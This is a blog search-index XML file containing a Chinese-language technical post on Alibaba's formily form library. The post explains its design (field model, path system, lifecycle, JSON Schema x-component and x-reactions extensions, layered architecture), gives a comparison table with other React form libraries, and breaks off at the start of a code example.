<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>formily</title>
    <link href="/blog/2023/10/02/formily/"/>
    <url>/blog/2023/10/02/formily/</url>
    
    <content type="html"><![CDATA[<h1 id="formily"><a href="#formily" class="headerlink" title="formily"></a>formily</h1><blockquote><p>仓库地址：<a href="https://github.com/alibaba/formily">https://github.com/alibaba/formily</a></p><p>官网地址：<a href="https://formilyjs.org/zh-CN/guide">https://formilyjs.org/zh-CN/guide</a></p></blockquote><h2 id="1、综述"><a href="#1、综述" class="headerlink" title="1、综述"></a>1、综述</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>问题：</p><ul><li><p>在 React 中，在受控模式下，表单的整树渲染问题非常明显。</p></li><li><p>特别是对于数据联动的场景，很容易导致页面卡顿。</p></li></ul><p>解决：</p><ul><li>为了解决这个问题，<code>formily</code>将每个表单字段的状态做了分布式管理，从而大大提升了表单操作性能。</li><li><code>formily</code>深度整合了 JSON Schema 协议，可以帮助您快速解决后端驱动表单渲染的问题。</li></ul><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul><li>可设计，借助 Form Builder 可以快速搭建表单</li><li>高性能，字段分布式渲染，大大减轻 React 渲染压力</li><li>支持 Ant Design&#x2F;Fusion Next 组件体系</li><li>JSX 标签化写法&#x2F;JSON Schema 数据驱动方案无缝迁移过渡</li><li>副作用逻辑独立管理，涵盖各种复杂联动校验逻辑</li><li>支持各种表单复杂布局方案</li></ul><h2 id="2、介绍"><a href="#2、介绍" class="headerlink" title="2、介绍"></a>2、介绍</h2><h3 id="表单场景的复杂度"><a href="#表单场景的复杂度" class="headerlink" title="表单场景的复杂度"></a>表单场景的复杂度</h3><ul><li>字段数量多，如何让性能不随字段数量增加而变差？</li><li>字段关联逻辑复杂，如何更简单的实现复杂的联动逻辑？字段与字段关联时，如何保证不影响表单性能？<ul><li>一对多(异步)</li><li>多对一(异步)</li><li>多对多(异步)</li></ul></li><li>表单数据管理复杂<ul><li>表单值转换逻辑复杂(前后端格式不一致)</li><li>同步默认值与异步默认值合并逻辑复杂</li><li>跨表单数据通信，如何让性能不随字段数量增加而变差？</li></ul></li><li>表单状态管理复杂<ul><li>着重提自增列表场景，如何让数组数据在移动，删除过程中，字段状态能够做到跟随移动？</li></ul></li><li>表单的场景化复用<ul><li>查询列表</li><li>弹窗&#x2F;抽屉表单</li><li>分步表单</li><li>选项卡表单</li></ul></li><li>动态渲染诉求很强烈<ul><li>字段配置化，让非专业前端也能快速搭建复杂表单</li><li>跨端渲染，一份 JSON Schema，多端适配</li><li>如何在表单协议中描述布局？<ul><li>纵向布局</li><li>横向布局</li><li>网格布局</li><li>弹性布局</li><li>自由布局</li></ul></li><li>如何在表单协议中描述逻辑？</li></ul></li></ul><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><h4 id="精确渲染"><a href="#精确渲染" class="headerlink" title="精确渲染"></a>精确渲染</h4><p>在 React 场景下实现一个表单需求，因为要收集表单数据，实现一些联动需求，大多数都是通过 setState 来实现字段数据收集，这样实现非常简单，心智成本非常低，但是却又引入了性能问题，因为每次输入都会导致所有字段全量渲染，虽然在 DOM 更新层面是有 diff，但是 diff 也是有计算成本的，浪费了很多计算资源，如果用时间复杂度来看的话，初次渲染表单是 O(n)，字段输入时也是 O(n)，这样明显是不合理的。</p><ul><li>MVVM 设计模式。这样的设计模式核心是将视图模型抽象出来，然后在 DSL 模板层消费，DSL 借助某种依赖收集机制，然后在视图模型中统一调度，保证每次输入都是精确渲染的。</li><li><a href="https://github.com/mobxjs/mobx">Mobx</a> 状态管理解决方案。Mobx 最核心的能力就是它的依赖追踪机制和响应式模型的抽象能力。</li></ul><h4 id="领域模型"><a href="#领域模型" class="headerlink" title="领域模型"></a>领域模型</h4><p>表单的联动是非常复杂的，包含了字段间的各种关系，我们想象一下，大多数表单联动，基本上都是基于某些字段的值引发的联动，但是，实际业务需求可能会比较恶心，不仅要基于某些字段值引发联动，还会基于其他副作用值引发联动，比如应用状态，服务端数据状态，页面 URL，某个字段 UI 组件内部数据，当前字段自身的其他数据状态，某些特殊异步事件等等。用张图来描述：</p><p><img src="https://img.alicdn.com/imgextra/i3/O1CN01LWjBSt251w5BtGHW2_!!6000000007467-55-tps-1100-432.svg" alt="image-20210202081316031"></p><p>从上图可以看到，想要达成一个联动关系，核心是<strong>将字段的某些状态属性与某些数据关联起来</strong>，这里的某些数据可以是外界数据，也可以是自身数据，比如字段的显示&#x2F;隐藏与某些数据的关联，又比如字段的值与某些数据关联，还比如字段的禁用&#x2F;编辑与某些数据关联，就举了 3 个例子，我们其实已经抽象出了一个最简单的 Field 模型：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Field</span> &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-built_in">any</span><br>  <span class="hljs-attr">visible</span>: <span class="hljs-built_in">boolean</span><br>  <span class="hljs-attr">disabled</span>: <span class="hljs-built_in">boolean</span><br>&#125;<br></code></pre></td></tr></table></figure><p>当然，Field 模型仅仅只有这 3 个属性吗？肯定不是，如果我们要表达一个字段，那么字段的路径一定要有，因为要描述整个表单树结构，同时，我们还要管理起字段对应 UI 组件的属性，比如 Input 和 Select 都有它的属性，举个例子，Input 的 placeholder 与某些数据关联，或者 Select 的下拉选项与某些数据关联，这样就能理解了吧。所以，我们的 Field 模型可以是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs unknown">interface Field &#123;<br>   path:string[],<br>   value:any,<br>   visible:boolean,<br>   disabled:boolean,<br>   component:[Component,ComponentProps]<br>&#125;<br></code></pre></td></tr></table></figure><p>我们加了 component 属性，它代表了字段所对应的 UI 组件和 UI 组件属性，这样就实现了某些数据与字段组件属性关联，甚至是与字段组件关联的能力。还有吗？当然还有，比如字段的外包裹容器，通常我们都叫 FormItem，它主要负责字段的外围的交互样式，比如字段标题，错误提示的样式等等，如果我们想要囊括更多联动，比如某些数据与 FormItem 的联动，那就得把外包裹容器也加进去。还有很多很多属性，这里没法一一列举。</p><p>从上面的思路中我们可以看到，为了解决联动问题，不管我们怎么抽象，最终还是会抽象出字段模型，它包含了字段相关的所有状态，只要去操作这些状态就能引发联动。</p><p>关于精确渲染，我们已经确定可以选用类似 Mobx 的 Reactive 方案，虽然是重新造了一个轮子，但是，Reactive 这种模式始终还是很适合抽象响应式模型，所以基于 Reactive 的能力，Formily 经过不断试错与纠正，总算设计出了真正优雅的表单模型。这样的表单模型，解决的是表单领域问题，所以也称之为领域模型，有了这样的领域模型，我们就能让表单的联动变得可枚举可预测，这样也为后面要说的协议描述联动打下了坚实基础。</p><h4 id="路径系统"><a href="#路径系统" class="headerlink" title="路径系统"></a>路径系统</h4><p>前面提到了表单领域模型中的字段模型，如果设计的更完备的话，其实不止是字段模型，必须还要有一个表单模型作为顶层模型，顶层模型管理着所有字段模型，每个字段都有着自己的路径，那如何查找这些字段呢？前面说到的联动关系，更多的是被动依赖关系，但是有些场景，我们就是要基于某个异步事件动作，去修改某个字段的状态，这里就涉及到如何优雅的查找某个字段，同样也是经过了大量的试错与纠正，Formily 独创的路径系统 @formily&#x2F;path 很好的解决了这个问题，不仅仅是让字段查找变得优雅，它还能通过解构表达式去处理前后端数据结构不一致的恶心问题。</p><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><p>借助 Mobx 和路径系统，我们已经打造了一个较为完备的表单方案了，但是这样抽象了之后，我们的方案就像个黑盒，外界无法感知到方案内部状态流转过程，想要在某个过程阶段内实现一些逻辑则无法实现，所以，这里我们就需要另外一个概念了，生命周期，只要我们将整个表单生命周期作为事件钩子暴露给外界，这样就能做到了既有抽象，但又灵活的表单方案。</p><h4 id="协议驱动"><a href="#协议驱动" class="headerlink" title="协议驱动"></a>协议驱动</h4><p>如果想要实现动态可配置表单，那必然是需要将表单结构变得可序列化，序列化的方式有很多种，可以是以 UI 为思路的 UI 描述协议，也可以是以数据为思路的数据描述协议，因为表单本身就是为了维护一份数据，那自然而然，对于表单场景而言，数据协议最适合不过，想要描述数据结构，现在业界最流行的就是 <a href="https://json-schema.org/"><strong>JSON-Schema</strong></a> 了，因为 JSON Schema 协议上本身就有很多校验相关的属性，这就天然和表单校验关联上了。那 UI 描述协议就真的不适合描述表单吗？No，UI 描述协议适合更通用的 UI 表达，描述表单当然不在话下，只是它会更偏前端协议，相反，JSON-Schema，在后端模型层，都是可表达的，在描述数据上更通用，所以两种协议，各有所长，只是在单纯表单领域，JSON-Schema 会更偏领域化一些。</p><p>那么，如果选用 JSON-Schema，我们怎么描述 UI，怎么描述逻辑呢？单纯的描述数据，想要输出实际业务可用的表单页面，不太现实。</p><p><a href="https://github.com/rjsf-team/react-jsonschema-form"><strong>react-jsonschema-form</strong></a>的解法是，数据是数据，UI 是 UI，这样的好处是，各个协议都是非常纯净的协议，但是却带来了较大的维护成本和理解成本，用户要开发一个表单，需要不断的在两种协议心智上做切换，所以，如果从技术视角来看这样的拆分，其实是非常合理的，但是从产品视角来看的话，拆分则是把成本抛给了用户，所以，Formily 的表单协议会更加倾向于<strong>在 JSON-Schema 上做扩展</strong>。</p><p>那么，如何扩展呢？为了不污染标准 JSON-Schema 属性，我们统一以<code>x-*</code>格式来表达扩展属性：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;字符串&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;这是一个字符串&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Input&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;x-component-props&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;请输入&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这样看来，UI 协议与数据协议混合在一起，只要有一个统一的扩展约定，也还是能保证两种协议职责单一。</p><p>然后，如果想要在某些字段上包裹一个 UI 容器怎么办呢？这里，Formily 定义了一个新的 schema type，叫<code>void</code>。void 不陌生，W3C 规范里也有 void element，js 里也有 void 关键字，前者代表虚元素，后者代表虚指针，所以，在 JSON Schema 中，引入 void，代表一个虚数据节点，表示该节点并不占用实际数据结构。所以，我们可以这样：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;void&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;卡片&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;这是一个卡片&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Card&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;string&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;字符串&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;这是一个字符串&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Input&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component-props&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;请输入&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这样就可以描述了一个 UI 容器了，因为可以描述 UI 容器，我们就能轻易封装一个场景化的组件了，比如 FormStep，那么我们怎么描述字段间联动呢？比如一个字段要控制另一个字段的显示隐藏。我们可以这样：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;object&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;source&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Source&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Input&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component-props&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;请输入&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;target&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Target&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Input&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component-props&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;请输入&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-reactions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;dependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;source&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;when&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;&#123;$deps[0] == &#x27;123&#x27;&#125;&#125;&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;fulfill&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>              <span class="hljs-attr">&quot;visible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;otherwise&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>              <span class="hljs-attr">&quot;visible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>          <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>借助<code>x-reactions</code>描述了 target 字段，依赖了 source 字段的值，如果值为<code>&#39;123&#39;</code>的时候则显示 target 字段，否则隐藏，这种联动方式是一种被动联动，那如果我们希望实现主动联动呢？可以这样：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;object&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;source&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Source&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Input&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component-props&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;请输入&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-reactions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;when&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;&#123;$self.value == &#x27;123&#x27;&#125;&#125;&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;target&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;target&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;fulfill&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>              <span class="hljs-attr">&quot;visible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;otherwise&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>              <span class="hljs-attr">&quot;visible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>          <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;target&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Target&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Input&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component-props&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;请输入&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>只需要将<code>x-reactions</code>换个位置，放到 source 字段上，然后再指定一个 target 即可。</p><p>可以看到，我们的联动，其实核心是基于：</p><ul><li>条件</li><li>条件满足的动作</li><li>条件不满足的动作</li></ul><p>来实现的，因为内部状态管理借助了 类似 Mobx 的<a href="https://reactive.formilyjs.org/zh-CN">@formily&#x2F;reactive</a>方案，所以，Formily 很轻松的就实现了被动和主动联动场景，覆盖了绝大多数业务需求。</p><p>所以，我们的表单完全可以使用协议来描述了，不管是再复杂的布局，还是很复杂的联动，都能做到可配置。</p><h4 id="分层架构"><a href="#分层架构" class="headerlink" title="分层架构"></a>分层架构</h4><p>前面讲了对于一开始的各种问题的解法，那么现在我们如何设计才能让 Formily 更加自洽且优雅呢？</p><p><img src="https://img.alicdn.com/imgextra/i3/O1CN01iEwHrP1NUw84xTded_!!6000000001574-55-tps-1939-1199.svg" alt="img"></p><p>这张图主要将 Formily 分为了内核层，UI 桥接层，扩展组件层，和配置应用层。</p><p>内核层是 UI 无关的，它保证了用户管理的逻辑和状态是不耦合任何一个框架，这样有几个好处：</p><ul><li>逻辑与 UI 框架解耦，未来做框架级别的迁移，业务代码无需大范围重构</li><li>学习成本统一，如果用户使用了@formily&#x2F;react，以后业务迁移@formily&#x2F;vue，用户不需要重新学习</li></ul><p>JSON Schema 独立存在，给 UI 桥接层消费，保证了协议驱动在不同 UI 框架下的绝对一致性，不需要重复实现协议解析逻辑。</p><p>扩展组件层，提供一系列表单场景化组件，保证用户开箱即用。无需花大量时间做二次开发。</p><h4 id="竞品对比"><a href="#竞品对比" class="headerlink" title="竞品对比"></a>竞品对比</h4><table><thead><tr><th align="left">能力</th><th align="left">Ant Design Form</th><th align="left">Fusion Form</th><th align="left">Formik</th><th align="left">React Final Form</th><th align="left">React Schema Form</th><th align="left">React Hook Form</th><th align="left">Formily1.x</th><th align="left">Formily2.x</th></tr></thead><tbody><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">自定义组件接入成本</td><td align="left">4.x接入成本低</td><td align="left">高</td><td align="left">低</td><td align="left">低</td><td align="left">高</td><td align="left">高</td><td align="left">低</td><td align="left">低</td></tr><tr><td align="left">性能</td><td align="left">4.x性能较好</td><td align="left">差</td><td align="left">差</td><td align="left">较好</td><td align="left">差</td><td align="left">好</td><td align="left">非常好</td><td align="left">非常好</td></tr><tr><td align="left">是否支持动态渲染</td><td align="left">否</td><td align="left">否</td><td align="left">否</td><td align="left">否</td><td align="left">是</td><td align="left">否</td><td align="left">是</td><td align="left">是</td></tr><tr><td align="left">是否开箱即用</td><td align="left">是</td><td align="left">是</td><td align="left">否</td><td align="left">否</td><td align="left">是</td><td align="left">否</td><td align="left">是</td><td align="left">是</td></tr><tr><td align="left">是否支持跨端</td><td align="left">否</td><td align="left">否</td><td align="left">否</td><td align="left">否</td><td align="left">否</td><td align="left">否</td><td align="left">是</td><td align="left">是</td></tr><tr><td align="left">开发效率</td><td align="left">一般</td><td align="left">一般</td><td align="left">一般</td><td align="left">一般</td><td align="left">低</td><td align="left">一般</td><td align="left">高</td><td align="left">高</td></tr><tr><td align="left">学习成本</td><td align="left">低</td><td align="left">低</td><td align="left">低</td><td align="left">高</td><td align="left">高</td><td align="left">低</td><td align="left">很高</td><td align="left">高</td></tr><tr><td align="left">视图代码可维护性</td><td align="left">低</td><td align="left">低</td><td align="left">低</td><td align="left">低</td><td align="left">高</td><td align="left">低</td><td align="left">高</td><td align="left">高</td></tr><tr><td align="left">场景化封装能力</td><td align="left">无</td><td align="left">无</td><td align="left">无</td><td align="left">无</td><td align="left">有</td><td align="left">无</td><td align="left">有</td><td align="left">有</td></tr><tr><td align="left">是否支持表单预览态</td><td align="left">否</td><td align="left">是</td><td align="left">否</td><td align="left">否</td><td align="left">否</td><td align="left">否</td><td align="left">是</td><td align="left">是</td></tr></tbody></table><h4 id="核心优势"><a href="#核心优势" class="headerlink" title="核心优势"></a>核心优势</h4><ul><li>高性能</li><li>开箱即用</li><li>联动逻辑实现高效</li><li>跨端能力，逻辑可跨框架，跨终端复用</li><li>动态渲染能力</li></ul><h2 id="3、具体用例"><a href="#3、具体用例" class="headerlink" title="3、具体用例"></a>3、具体用例</h2><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 